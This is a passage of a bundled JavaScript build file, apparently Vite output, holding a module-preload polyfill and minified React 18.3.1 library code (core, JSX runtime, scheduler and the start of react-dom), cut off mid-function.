function Of(e, t) {
  for (var n = 0; n < t.length; n++) {
    const r = t[n];
    if (typeof r != "string" && !Array.isArray(r)) {
      for (const l in r)
        if (l !== "default" && !(l in e)) {
          const i = Object.getOwnPropertyDescriptor(r, l);
          i &&
            Object.defineProperty(
              e,
              l,
              i.get ? i : { enumerable: !0, get: () => r[l] }
            );
        }
    }
  }
  return Object.freeze(
    Object.defineProperty(e, Symbol.toStringTag, { value: "Module" })
  );
}
(function () {
  const t = document.createElement("link").relList;
  if (t && t.supports && t.supports("modulepreload")) return;
  for (const l of document.querySelectorAll('link[rel="modulepreload"]')) r(l);
  new MutationObserver((l) => {
    for (const i of l)
      if (i.type === "childList")
        for (const o of i.addedNodes)
          o.tagName === "LINK" && o.rel === "modulepreload" && r(o);
  }).observe(document, { childList: !0, subtree: !0 });
  function n(l) {
    const i = {};
    return (
      l.integrity && (i.integrity = l.integrity),
      l.referrerPolicy && (i.referrerPolicy = l.referrerPolicy),
      l.crossOrigin === "use-credentials"
        ? (i.credentials = "include")
        : l.crossOrigin === "anonymous"
        ? (i.credentials = "omit")
        : (i.credentials = "same-origin"),
      i
    );
  }
  function r(l) {
    if (l.ep) return;
    l.ep = !0;
    const i = n(l);
    fetch(l.href, i);
  }
})();
function Mf(e) {
  return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default")
    ? e.default
    : e;
}
var Ws = { exports: {} },
  ml = {},
  Xs = { exports: {} },
  z = {};
/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var lr = Symbol.for("react.element"),
  Ff = Symbol.for("react.portal"),
  Bf = Symbol.for("react.fragment"),
  Vf = Symbol.for("react.strict_mode"),
  Qf = Symbol.for("react.profiler"),
  Df = Symbol.for("react.provider"),
  Kf = Symbol.for("react.context"),
  Wf = Symbol.for("react.forward_ref"),
  Xf = Symbol.for("react.suspense"),
  Hf = Symbol.for("react.memo"),
  Jf = Symbol.for("react.lazy"),
  pu = Symbol.iterator;
function Gf(e) {
  return e === null || typeof e != "object"
    ? null
    : ((e = (pu && e[pu]) || e["@@iterator"]),
      typeof e == "function" ? e : null);
}
var Hs = {
    isMounted: function () {
      return !1;
    },
    enqueueForceUpdate: function () {},
    enqueueReplaceState: function () {},
    enqueueSetState: function () {},
  },
  Js = Object.assign,
  Gs = {};
function fn(e, t, n) {
  (this.props = e),
    (this.context = t),
    (this.refs = Gs),
    (this.updater = n || Hs);
}
fn.prototype.isReactComponent = {};
fn.prototype.setState = function (e, t) {
  if (typeof e != "object" && typeof e != "function" && e != null)
    throw Error(
      "setState(...): takes an object of state variables to update or a function which returns an object of state variables."
    );
  this.updater.enqueueSetState(this, e, t, "setState");
};
fn.prototype.forceUpdate = function (e) {
  this.updater.enqueueForceUpdate(this, e, "forceUpdate");
};
function qs() {}
qs.prototype = fn.prototype;
function fo(e, t, n) {
  (this.props = e),
    (this.context = t),
    (this.refs = Gs),
    (this.updater = n || Hs);
}
var po = (fo.prototype = new qs());
po.constructor = fo;
Js(po, fn.prototype);
po.isPureReactComponent = !0;
var Au = Array.isArray,
  Ys = Object.prototype.hasOwnProperty,
  Ao = { current: null },
  Zs = { key: !0, ref: !0, __self: !0, __source: !0 };
function bs(e, t, n) {
  var r,
    l = {},
    i = null,
    o = null;
  if (t != null)
    for (r in (t.ref !== void 0 && (o = t.ref),
    t.key !== void 0 && (i = "" + t.key),
    t))
      Ys.call(t, r) && !Zs.hasOwnProperty(r) && (l[r] = t[r]);
  var u = arguments.length - 2;
  if (u === 1) l.children = n;
  else if (1 < u) {
    for (var s = Array(u), a = 0; a < u; a++) s[a] = arguments[a + 2];
    l.children = s;
  }
  if (e && e.defaultProps)
    for (r in ((u = e.defaultProps), u)) l[r] === void 0 && (l[r] = u[r]);
  return {
    $$typeof: lr,
    type: e,
    key: i,
    ref: o,
    props: l,
    _owner: Ao.current,
  };
}
function qf(e, t) {
  return {
    $$typeof: lr,
    type: e.type,
    key: t,
    ref: e.ref,
    props: e.props,
    _owner: e._owner,
  };
}
function ho(e) {
  return typeof e == "object" && e !== null && e.$$typeof === lr;
}
function Yf(e) {
  var t = { "=": "=0", ":": "=2" };
  return (
    "$" +
    e.replace(/[=:]/g, function (n) {
      return t[n];
    })
  );
}
var hu = /\/+/g;
function Vl(e, t) {
  return typeof e == "object" && e !== null && e.key != null
    ? Yf("" + e.key)
    : t.toString(36);
}
function Tr(e, t, n, r, l) {
  var i = typeof e;
  (i === "undefined" || i === "boolean") && (e = null);
  var o = !1;
  if (e === null) o = !0;
  else
    switch (i) {
      case "string":
      case "number":
        o = !0;
        break;
      case "object":
        switch (e.$$typeof) {
          case lr:
          case Ff:
            o = !0;
        }
    }
  if (o)
    return (
      (o = e),
      (l = l(o)),
      (e = r === "" ? "." + Vl(o, 0) : r),
      Au(l)
        ? ((n = ""),
          e != null && (n = e.replace(hu, "$&/") + "/"),
          Tr(l, t, n, "", function (a) {
            return a;
          }))
        : l != null &&
          (ho(l) &&
            (l = qf(
              l,
              n +
                (!l.key || (o && o.key === l.key)
                  ? ""
                  : ("" + l.key).replace(hu, "$&/") + "/") +
                e
            )),
          t.push(l)),
      1
    );
  if (((o = 0), (r = r === "" ? "." : r + ":"), Au(e)))
    for (var u = 0; u < e.length; u++) {
      i = e[u];
      var s = r + Vl(i, u);
      o += Tr(i, t, n, s, l);
    }
  else if (((s = Gf(e)), typeof s == "function"))
    for (e = s.call(e), u = 0; !(i = e.next()).done; )
      (i = i.value), (s = r + Vl(i, u++)), (o += Tr(i, t, n, s, l));
  else if (i === "object")
    throw (
      ((t = String(e)),
      Error(
        "Objects are not valid as a React child (found: " +
          (t === "[object Object]"
            ? "object with keys {" + Object.keys(e).join(", ") + "}"
            : t) +
          "). If you meant to render a collection of children, use an array instead."
      ))
    );
  return o;
}
function dr(e, t, n) {
  if (e == null) return e;
  var r = [],
    l = 0;
  return (
    Tr(e, r, "", "", function (i) {
      return t.call(n, i, l++);
    }),
    r
  );
}
function Zf(e) {
  if (e._status === -1) {
    var t = e._result;
    (t = t()),
      t.then(
        function (n) {
          (e._status === 0 || e._status === -1) &&
            ((e._status = 1), (e._result = n));
        },
        function (n) {
          (e._status === 0 || e._status === -1) &&
            ((e._status = 2), (e._result = n));
        }
      ),
      e._status === -1 && ((e._status = 0), (e._result = t));
  }
  if (e._status === 1) return e._result.default;
  throw e._result;
}
var ae = { current: null },
  Lr = { transition: null },
  bf = {
    ReactCurrentDispatcher: ae,
    ReactCurrentBatchConfig: Lr,
    ReactCurrentOwner: Ao,
  };
function _s() {
  throw Error("act(...) is not supported in production builds of React.");
}
z.Children = {
  map: dr,
  forEach: function (e, t, n) {
    dr(
      e,
      function () {
        t.apply(this, arguments);
      },
      n
    );
  },
  count: function (e) {
    var t = 0;
    return (
      dr(e, function () {
        t++;
      }),
      t
    );
  },
  toArray: function (e) {
    return (
      dr(e, function (t) {
        return t;
      }) || []
    );
  },
  only: function (e) {
    if (!ho(e))
      throw Error(
        "React.Children.only expected to receive a single React element child."
      );
    return e;
  },
};
z.Component = fn;
z.Fragment = Bf;
z.Profiler = Qf;
z.PureComponent = fo;
z.StrictMode = Vf;
z.Suspense = Xf;
z.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = bf;
z.act = _s;
z.cloneElement = function (e, t, n) {
  if (e == null)
    throw Error(
      "React.cloneElement(...): The argument must be a React element, but you passed " +
        e +
        "."
    );
  var r = Js({}, e.props),
    l = e.key,
    i = e.ref,
    o = e._owner;
  if (t != null) {
    if (
      (t.ref !== void 0 && ((i = t.ref), (o = Ao.current)),
      t.key !== void 0 && (l = "" + t.key),
      e.type && e.type.defaultProps)
    )
      var u = e.type.defaultProps;
    for (s in t)
      Ys.call(t, s) &&
        !Zs.hasOwnProperty(s) &&
        (r[s] = t[s] === void 0 && u !== void 0 ? u[s] : t[s]);
  }
  var s = arguments.length - 2;
  if (s === 1) r.children = n;
  else if (1 < s) {
    u = Array(s);
    for (var a = 0; a < s; a++) u[a] = arguments[a + 2];
    r.children = u;
  }
  return { $$typeof: lr, type: e.type, key: l, ref: i, props: r, _owner: o };
};
z.createContext = function (e) {
  return (
    (e = {
      $$typeof: Kf,
      _currentValue: e,
      _currentValue2: e,
      _threadCount: 0,
      Provider: null,
      Consumer: null,
      _defaultValue: null,
      _globalName: null,
    }),
    (e.Provider = { $$typeof: Df, _context: e }),
    (e.Consumer = e)
  );
};
z.createElement = bs;
z.createFactory = function (e) {
  var t = bs.bind(null, e);
  return (t.type = e), t;
};
z.createRef = function () {
  return { current: null };
};
z.forwardRef = function (e) {
  return { $$typeof: Wf, render: e };
};
z.isValidElement = ho;
z.lazy = function (e) {
  return { $$typeof: Jf, _payload: { _status: -1, _result: e }, _init: Zf };
};
z.memo = function (e, t) {
  return { $$typeof: Hf, type: e, compare: t === void 0 ? null : t };
};
z.startTransition = function (e) {
  var t = Lr.transition;
  Lr.transition = {};
  try {
    e();
  } finally {
    Lr.transition = t;
  }
};
z.unstable_act = _s;
z.useCallback = function (e, t) {
  return ae.current.useCallback(e, t);
};
z.useContext = function (e) {
  return ae.current.useContext(e);
};
z.useDebugValue = function () {};
z.useDeferredValue = function (e) {
  return ae.current.useDeferredValue(e);
};
z.useEffect = function (e, t) {
  return ae.current.useEffect(e, t);
};
z.useId = function () {
  return ae.current.useId();
};
z.useImperativeHandle = function (e, t, n) {
  return ae.current.useImperativeHandle(e, t, n);
};
z.useInsertionEffect = function (e, t) {
  return ae.current.useInsertionEffect(e, t);
};
z.useLayoutEffect = function (e, t) {
  return ae.current.useLayoutEffect(e, t);
};
z.useMemo = function (e, t) {
  return ae.current.useMemo(e, t);
};
z.useReducer = function (e, t, n) {
  return ae.current.useReducer(e, t, n);
};
z.useRef = function (e) {
  return ae.current.useRef(e);
};
z.useState = function (e) {
  return ae.current.useState(e);
};
z.useSyncExternalStore = function (e, t, n) {
  return ae.current.useSyncExternalStore(e, t, n);
};
z.useTransition = function () {
  return ae.current.useTransition();
};
z.version = "18.3.1";
Xs.exports = z;
var j = Xs.exports;
const _f = Mf(j),
  $f = Of({ __proto__: null, default: _f }, [j]);
/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var ed = j,
  td = Symbol.for("react.element"),
  nd = Symbol.for("react.fragment"),
  rd = Object.prototype.hasOwnProperty,
  ld = ed.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,
  id = { key: !0, ref: !0, __self: !0, __source: !0 };
function $s(e, t, n) {
  var r,
    l = {},
    i = null,
    o = null;
  n !== void 0 && (i = "" + n),
    t.key !== void 0 && (i = "" + t.key),
    t.ref !== void 0 && (o = t.ref);
  for (r in t) rd.call(t, r) && !id.hasOwnProperty(r) && (l[r] = t[r]);
  if (e && e.defaultProps)
    for (r in ((t = e.defaultProps), t)) l[r] === void 0 && (l[r] = t[r]);
  return {
    $$typeof: td,
    type: e,
    key: i,
    ref: o,
    props: l,
    _owner: ld.current,
  };
}
ml.Fragment = nd;
ml.jsx = $s;
ml.jsxs = $s;
Ws.exports = ml;
var m = Ws.exports,
  ea = { exports: {} },
  xe = {},
  ta = { exports: {} },
  na = {};
/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ (function (e) {
  function t(N, U) {
    var I = N.length;
    N.push(U);
    e: for (; 0 < I; ) {
      var H = (I - 1) >>> 1,
        Z = N[H];
      if (0 < l(Z, U)) (N[H] = U), (N[I] = Z), (I = H);
      else break e;
    }
  }
  function n(N) {
    return N.length === 0 ? null : N[0];
  }
  function r(N) {
    if (N.length === 0) return null;
    var U = N[0],
      I = N.pop();
    if (I !== U) {
      N[0] = I;
      e: for (var H = 0, Z = N.length, cr = Z >>> 1; H < cr; ) {
        var wt = 2 * (H + 1) - 1,
          Bl = N[wt],
          St = wt + 1,
          fr = N[St];
        if (0 > l(Bl, I))
          St < Z && 0 > l(fr, Bl)
            ? ((N[H] = fr), (N[St] = I), (H = St))
            : ((N[H] = Bl), (N[wt] = I), (H = wt));
        else if (St < Z && 0 > l(fr, I)) (N[H] = fr), (N[St] = I), (H = St);
        else break e;
      }
    }
    return U;
  }
  function l(N, U) {
    var I = N.sortIndex - U.sortIndex;
    return I !== 0 ? I : N.id - U.id;
  }
  if (typeof performance == "object" && typeof performance.now == "function") {
    var i = performance;
    e.unstable_now = function () {
      return i.now();
    };
  } else {
    var o = Date,
      u = o.now();
    e.unstable_now = function () {
      return o.now() - u;
    };
  }
  var s = [],
    a = [],
    p = 1,
    d = null,
    h = 3,
    g = !1,
    v = !1,
    w = !1,
    S = typeof setTimeout == "function" ? setTimeout : null,
    f = typeof clearTimeout == "function" ? clearTimeout : null,
    c = typeof setImmediate < "u" ? setImmediate : null;
  typeof navigator < "u" &&
    navigator.scheduling !== void 0 &&
    navigator.scheduling.isInputPending !== void 0 &&
    navigator.scheduling.isInputPending.bind(navigator.scheduling);
  function A(N) {
    for (var U = n(a); U !== null; ) {
      if (U.callback === null) r(a);
      else if (U.startTime <= N)
        r(a), (U.sortIndex = U.expirationTime), t(s, U);
      else break;
      U = n(a);
    }
  }
  function y(N) {
    if (((w = !1), A(N), !v))
      if (n(s) !== null) (v = !0), Ml(k);
      else {
        var U = n(a);
        U !== null && Fl(y, U.startTime - N);
      }
  }
  function k(N, U) {
    (v = !1), w && ((w = !1), f(T), (T = -1)), (g = !0);
    var I = h;
    try {
      for (
        A(U), d = n(s);
        d !== null && (!(d.expirationTime > U) || (N && !Le()));

      ) {
        var H = d.callback;
        if (typeof H == "function") {
          (d.callback = null), (h = d.priorityLevel);
          var Z = H(d.expirationTime <= U);
          (U = e.unstable_now()),
            typeof Z == "function" ? (d.callback = Z) : d === n(s) && r(s),
            A(U);
        } else r(s);
        d = n(s);
      }
      if (d !== null) var cr = !0;
      else {
        var wt = n(a);
        wt !== null && Fl(y, wt.startTime - U), (cr = !1);
      }
      return cr;
    } finally {
      (d = null), (h = I), (g = !1);
    }
  }
  var E = !1,
    C = null,
    T = -1,
    M = 5,
    L = -1;
  function Le() {
    return !(e.unstable_now() - L < M);
  }
  function An() {
    if (C !== null) {
      var N = e.unstable_now();
      L = N;
      var U = !0;
      try {
        U = C(!0, N);
      } finally {
        U ? hn() : ((E = !1), (C = null));
      }
    } else E = !1;
  }
  var hn;
  if (typeof c == "function")
    hn = function () {
      c(An);
    };
  else if (typeof MessageChannel < "u") {
    var du = new MessageChannel(),
      Rf = du.port2;
    (du.port1.onmessage = An),
      (hn = function () {
        Rf.postMessage(null);
      });
  } else
    hn = function () {
      S(An, 0);
    };
  function Ml(N) {
    (C = N), E || ((E = !0), hn());
  }
  function Fl(N, U) {
    T = S(function () {
      N(e.unstable_now());
    }, U);
  }
  (e.unstable_IdlePriority = 5),
    (e.unstable_ImmediatePriority = 1),
    (e.unstable_LowPriority = 4),
    (e.unstable_NormalPriority = 3),
    (e.unstable_Profiling = null),
    (e.unstable_UserBlockingPriority = 2),
    (e.unstable_cancelCallback = function (N) {
      N.callback = null;
    }),
    (e.unstable_continueExecution = function () {
      v || g || ((v = !0), Ml(k));
    }),
    (e.unstable_forceFrameRate = function (N) {
      0 > N || 125 < N
        ? console.error(
            "forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"
          )
        : (M = 0 < N ? Math.floor(1e3 / N) : 5);
    }),
    (e.unstable_getCurrentPriorityLevel = function () {
      return h;
    }),
    (e.unstable_getFirstCallbackNode = function () {
      return n(s);
    }),
    (e.unstable_next = function (N) {
      switch (h) {
        case 1:
        case 2:
        case 3:
          var U = 3;
          break;
        default:
          U = h;
      }
      var I = h;
      h = U;
      try {
        return N();
      } finally {
        h = I;
      }
    }),
    (e.unstable_pauseExecution = function () {}),
    (e.unstable_requestPaint = function () {}),
    (e.unstable_runWithPriority = function (N, U) {
      switch (N) {
        case 1:
        case 2:
        case 3:
        case 4:
        case 5:
          break;
        default:
          N = 3;
      }
      var I = h;
      h = N;
      try {
        return U();
      } finally {
        h = I;
      }
    }),
    (e.unstable_scheduleCallback = function (N, U, I) {
      var H = e.unstable_now();
      switch (
        (typeof I == "object" && I !== null
          ? ((I = I.delay), (I = typeof I == "number" && 0 < I ? H + I : H))
          : (I = H),
        N)
      ) {
        case 1:
          var Z = -1;
          break;
        case 2:
          Z = 250;
          break;
        case 5:
          Z = 1073741823;
          break;
        case 4:
          Z = 1e4;
          break;
        default:
          Z = 5e3;
      }
      return (
        (Z = I + Z),
        (N = {
          id: p++,
          callback: U,
          priorityLevel: N,
          startTime: I,
          expirationTime: Z,
          sortIndex: -1,
        }),
        I > H
          ? ((N.sortIndex = I),
            t(a, N),
            n(s) === null &&
              N === n(a) &&
              (w ? (f(T), (T = -1)) : (w = !0), Fl(y, I - H)))
          : ((N.sortIndex = Z), t(s, N), v || g || ((v = !0), Ml(k))),
        N
      );
    }),
    (e.unstable_shouldYield = Le),
    (e.unstable_wrapCallback = function (N) {
      var U = h;
      return function () {
        var I = h;
        h = U;
        try {
          return N.apply(this, arguments);
        } finally {
          h = I;
        }
      };
    });
})(na);
ta.exports = na;
var od = ta.exports;
/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var ud = j,
  Se = od;
function x(e) {
  for (
    var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1;
    n < arguments.length;
    n++
  )
    t += "&args[]=" + encodeURIComponent(arguments[n]);
  return (
    "Minified React error #" +
    e +
    "; visit " +
    t +
    " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
  );
}
var ra = new Set(),
  Qn = {};
function Rt(e, t) {
  nn(e, t), nn(e + "Capture", t);
}
function nn(e, t) {
  for (Qn[e] = t, e = 0; e < t.length; e++) ra.add(t[e]);
}
var qe = !(
    typeof window > "u" ||
    typeof window.document > "u" ||
    typeof window.document.createElement > "u"
  ),
  pi = Object.prototype.hasOwnProperty,
  sd =
    /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
  mu = {},
  gu = {};
function ad(e) {
  return pi.call(gu, e)
    ? !0
    : pi.call(mu, e)
    ? !1
    : sd.test(e)
    ? (gu[e] = !0)
    : ((mu[e] = !0), !1);
}
function cd(e, t, n, r) {
  if (n !== null && n.type === 0) return !1;
  switch (typeof t) {
    case "function":
    case "symbol":
      return !0;
    case "boolean":
      return r
        ? !1
        : n !== null
        ? !n.acceptsBooleans
        : ((e = e.toLowerCase().slice(0, 5)), e !== "data-" && e !== "aria-");
    default:
      return !1;
  }
}
function fd(e, t, n, r) {
  if (t === null || typeof t > "u" || cd(e, t, n, r)) return !0;
  if (r) return !1;
  if (n !== null)
    switch (n.type) {
      case 3:
        return !t;
      case 4:
        return t === !1;
      case 5:
        return isNaN(t);
      case 6:
        return isNaN(t) || 1 > t;
    }
  return !1;
}
function ce(e, t, n, r, l, i, o) {
  (this.acceptsBooleans = t === 2 || t === 3 || t === 4),
    (this.attributeName = r),
    (this.attributeNamespace = l),
    (this.mustUseProperty = n),
    (this.propertyName = e),
    (this.type = t),
    (this.sanitizeURL = i),
    (this.removeEmptyString = o);
}
var ne = {};
"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style"
  .split(" ")
  .forEach(function (e) {
    ne[e] = new ce(e, 0, !1, e, null, !1, !1);
  });
[
  ["acceptCharset", "accept-charset"],
  ["className", "class"],
  ["htmlFor", "for"],
  ["httpEquiv", "http-equiv"],
].forEach(function (e) {
  var t = e[0];
  ne[t] = new ce(t, 1, !1, e[1], null, !1, !1);
});
["contentEditable", "draggable", "spellCheck", "value"].forEach(function (e) {
  ne[e] = new ce(e, 2, !1, e.toLowerCase(), null, !1, !1);
});
[
  "autoReverse",
  "externalResourcesRequired",
  "focusable",
  "preserveAlpha",
].forEach(function (e) {
  ne[e] = new ce(e, 2, !1, e, null, !1, !1);
});
"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope"
  .split(" ")
  .forEach(function (e) {
    ne[e] = new ce(e, 3, !1, e.toLowerCase(), null, !1, !1);
  });
["checked", "multiple", "muted", "selected"].forEach(function (e) {
  ne[e] = new ce(e, 3, !0, e, null, !1, !1);
});
["capture", "download"].forEach(function (e) {
  ne[e] = new ce(e, 4, !1, e, null, !1, !1);
});
["cols", "rows", "size", "span"].forEach(function (e) {
  ne[e] = new ce(e, 6, !1, e, null, !1, !1);
});
["rowSpan", "start"].forEach(function (e) {
  ne[e] = new ce(e, 5, !1, e.toLowerCase(), null, !1, !1);
});
var mo = /[\-:]([a-z])/g;
function go(e) {
  return e[1].toUpperCase();
}
"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height"
  .split(" ")
  .forEach(function (e) {
    var t = e.replace(mo, go);
    ne[t] = new ce(t, 1, !1, e, null, !1, !1);
  });
"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type"
  .split(" ")
  .forEach(function (e) {
    var t = e.replace(mo, go);
    ne[t] = new ce(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1);
  });
["xml:base", "xml:lang", "xml:space"].forEach(function (e) {
  var t = e.replace(mo, go);
  ne[t] = new ce(t, 1, !1, e, "http://www.w3.org/XML/1998/namespace", !1, !1);
});
["tabIndex", "crossOrigin"].forEach(function (e) {
  ne[e] = new ce(e, 1, !1, e.toLowerCase(), null, !1, !1);
});
ne.xlinkHref = new ce(
  "xlinkHref",
  1,
  !1,
  "xlink:href",
  "http://www.w3.org/1999/xlink",
  !0,
  !1
);
["src", "href", "action", "formAction"].forEach(function (e) {
  ne[e] = new ce(e, 1, !1, e.toLowerCase(), null, !0, !0);
});
function vo(e, t, n, r) {
  var l = ne.hasOwnProperty(t) ? ne[t] : null;
  (l !== null
    ? l.type !== 0
    : r ||
      !(2 < t.length) ||
      (t[0] !== "o" && t[0] !== "O") ||
      (t[1] !== "n" && t[1] !== "N")) &&
    (fd(t, n, l, r) && (n = null),
    r || l === null
      ? ad(t) && (n === null ? e.removeAttribute(t) : e.setAttribute(t, "" + n))
      : l.mustUseProperty
      ? (e[l.propertyName] = n === null ? (l.type === 3 ? !1 : "") : n)
      : ((t = l.attributeName),
        (r = l.attributeNamespace),
        n === null
          ? e.removeAttribute(t)
          : ((l = l.type),
            (n = l === 3 || (l === 4 && n === !0) ? "" : "" + n),
            r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))));
}
var _e = ud.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
  pr = Symbol.for("react.element"),
  Ft = Symbol.for("react.portal"),
  Bt = Symbol.for("react.fragment"),
  yo = Symbol.for("react.strict_mode"),
  Ai = Symbol.for("react.profiler"),
  la = Symbol.for("react.provider"),
  ia = Symbol.for("react.context"),
  wo = Symbol.for("react.forward_ref"),
  hi = Symbol.for("react.suspense"),
  mi = Symbol.for("react.suspense_list"),
  So = Symbol.for("react.memo"),
  et = Symbol.for("react.lazy"),
  oa = Symbol.for("react.offscreen"),
  vu = Symbol.iterator;
function mn(e) {
  return e === null || typeof e != "object"
    ? null
    : ((e = (vu && e[vu]) || e["@@iterator"]),
      typeof e == "function" ? e : null);
}
var W = Object.assign,
  Ql;
function Pn(e) {
  if (Ql === void 0)
    try {
      throw Error();
    } catch (n) {
      var t = n.stack.trim().match(/\n( *(at )?)/);
      Ql = (t && t[1]) || "";
    }
  return (
    `
` +
    Ql +
    e
  );
}
var Dl = !1;
function Kl(e, t) {
  if (!e || Dl) return "";
  Dl = !0;
  var n = Error.prepareStackTrace;
  Error.prepareStackTrace = void 0;
  try {
    if (t)
      if (
        ((t = function () {
          throw Error();
        }),
        Object.defineProperty(t.prototype, "props", {
          set: function () {
            throw Error();
          },
        }),
        typeof Reflect == "object" && Reflect.construct)
      ) {
        try {
          Reflect.construct(t, []);
        } catch (a) {
          var r = a;
        }
        Reflect.construct(e, [], t);
      } else {
        try {
          t.call();
        } catch (a) {
          r = a;
        }
        e.call(t.prototype);
      }
    else {
      try {
        throw Error();
      } catch (a) {
        r = a;
      }
      e();
    }
  } catch (a) {
    if (a && r && typeof a.stack == "string") {
      for (
        var l = a.stack.split(`
`),
          i = r.stack.split(`
`),
          o = l.length - 1,
          u = i.length - 1;
        1 <= o && 0 <= u && l[o] !== i[u];

      )
        u--;
      for (; 1 <= o && 0 <= u; o--, u--)
        if (l[o] !== i[u]) {
          if (o !== 1 || u !== 1)
            do
              if ((o--, u--, 0 > u || l[o] !== i[u])) {
                var s =
                  `
` + l[o].replace(" at new ", " at ");
                return (
                  e.displayName &&
                    s.includes("<anonymous>") &&
                    (s = s.replace("<anonymous>", e.displayName)),
                  s
                );
              }
            while (1 <= o && 0 <= u);
          break;
        }
    }
  } finally {
    (Dl = !1), (Error.prepareStackTrace = n);
  }
  return (e = e ? e.displayName || e.name : "") ? Pn(e) : "";
}
function dd(e) {
  switch (e.tag) {
    case 5:
      return Pn(e.type);
    case 16:
      return Pn("Lazy");
    case 13:
      return Pn("Suspense");
    case 19:
      return Pn("SuspenseList");
    case 0:
    case 2:
    case 15:
      return (e = Kl(e.type, !1)), e;
    case 11:
      return (e = Kl(e.type.render, !1)), e;
    case 1:
      return (e = Kl(e.type, !0)), e;
    default:
      return "";
  }
}
function gi(e) {
  if (e == null) return null;
  if (typeof e == "function") return e.displayName || e.name || null;
  if (typeof e == "string") return e;
  switch (e) {
    case Bt:
      return "Fragment";
    case Ft:
      return "Portal";
    case Ai:
      return "Profiler";
    case yo:
      return "StrictMode";
    case hi:
      return "Suspense";
    case mi:
      return "SuspenseList";
  }
  if (typeof e == "object")
    switch (e.$$typeof) {
      case ia:
        return (e.displayName || "Context") + ".Consumer";
      case la:
        return (e._context.displayName || "Context") + ".Provider";
      case wo:
        var t = e.render;
        return (
          (e = e.displayName),
          e ||
            ((e = t.displayName || t.name || ""),
            (e = e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef")),
          e
        );
      case So:
        return (
          (t = e.displayName || null), t !== null ? t : gi(e.type) || "Memo"
        );
      case et:
        (t = e._payload), (e = e._init);
        try {
          return gi(e(t));
        } catch {}
    }
  return null;
}
function pd(e) {
  var t = e.type;
  switch (e.tag) {
    case 24:
      return "Cache";
    case 9:
      return (t.displayName || "Context") + ".Consumer";
    case 10:
      return (t._context.displayName || "Context") + ".Provider";
    case 18:
      return "DehydratedFragment";
    case 11:
      return (
        (e = t.render),
        (e = e.displayName || e.name || ""),
        t.displayName || (e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef")
      );
    case 7:
      return "Fragment";
    case 5:
      return t;
    case 4:
      return "Portal";
    case 3:
      return "Root";
    case 6:
      return "Text";
    case 16:
      return gi(t);
    case 8:
      return t === yo ? "StrictMode" : "Mode";
    case 22:
      return "Offscreen";
    case 12:
      return "Profiler";
    case 21:
      return "Scope";
    case 13:
      return "Suspense";
    case 19:
      return "SuspenseList";
    case 25:
      return "TracingMarker";
    case 1:
    case 0:
    case 17:
    case 2:
    case 14:
    case 15:
      if (typeof t == "function") return t.displayName || t.name || null;
      if (typeof t == "string") return t;
  }
  return null;
}
function ht(e) {
  switch (typeof e) {
    case "boolean":
    case "number":
    case "string":
    case "undefined":
      return e;
    case "object":
      return e;
    default:
      return "";
  }
}
function ua(e) {
  var t = e.type;
  return (
    (e = e.nodeName) &&
    e.toLowerCase() === "input" &&
    (t === "checkbox" || t === "radio")
  );
}
function Ad(e) {
  var t = ua(e) ? "checked" : "value",
    n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
    r = "" + e[t];
  if (
    !e.hasOwnProperty(t) &&
    typeof n < "u" &&
    typeof n.get == "function" &&
    typeof n.set == "function"
  ) {
    var l = n.get,
      i = n.set;
    return (
      Object.defineProperty(e, t, {
        configurable: !0,
        get: function () {
          return l.call(this);
        },
        set: function (o) {
          (r = "" + o), i.call(this, o);
        },
      }),
